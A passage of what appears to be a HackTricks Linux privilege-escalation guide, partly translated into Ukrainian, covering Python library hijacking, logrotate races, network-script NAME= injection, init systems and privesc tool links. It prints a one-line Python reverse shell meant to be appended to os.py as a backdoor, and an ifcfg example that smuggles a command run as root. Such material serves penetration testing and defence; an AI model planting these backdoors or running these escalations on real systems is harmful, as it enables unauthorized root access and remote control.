Я не збираюся тут перелічувати, як робити все це, але якщо вам цікаво, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Уразливість в `logrotate` дозволяє користувачам з **write permissions** на лог-файл або його батьківські директорії потенційно отримати підвищені привілеї. Це тому, що `logrotate`, часто запущений як **root**, може бути підманіпульований для виконання довільних файлів, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не тільки в _/var/log_, але й у будь-якій директорії, де застосовується rotація логів.

> [!TIP]
> Ця уразливість зачіпає `logrotate` версії `3.18.0` та старіші

Більш детальну інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю уразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тож коли ви виявите, що можете змінювати логи, перевірте, хто управляє тими логами, і чи можна підвищити привілеї, замінивши логи на symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо, з якоїсь причини, користувач може **write** скрипт `ifcf-<whatever>` в _/etc/sysconfig/network-scripts_ **or** може **adjust** існуючий, то ваша **system is pwned**.

Мережеві скрипти, наприклад _ifcg-eth0_, використовуються для мережевих підключень. Вони виглядають точно як .INI файли. Однак вони \~sourced\~ в Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` в цих мережевих скриптах обробляється некоректно. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. Це означає, що **everything after the first blank space is executed as root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(Примітка: пробіл між Network та /bin/id_)

### **init, init.d, systemd, та rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Він містить скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Ці скрипти можна виконувати безпосередньо або через символічні посилання, що знаходяться в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов'язаний з **Upstart**, новішою системою **service management**, запровадженою в Ubuntu, яка використовує конфігураційні файли для керування сервісами. Незважаючи на перехід до Upstart, скрипти SysVinit все ще використовуються поряд із конфігураціями Upstart через шар сумісності в Upstart.

**systemd** є сучасним ініціалізатором та менеджером сервісів, що пропонує розширені можливості, такі як запуск демонів за потреби, керування automount та знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибуції та в `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
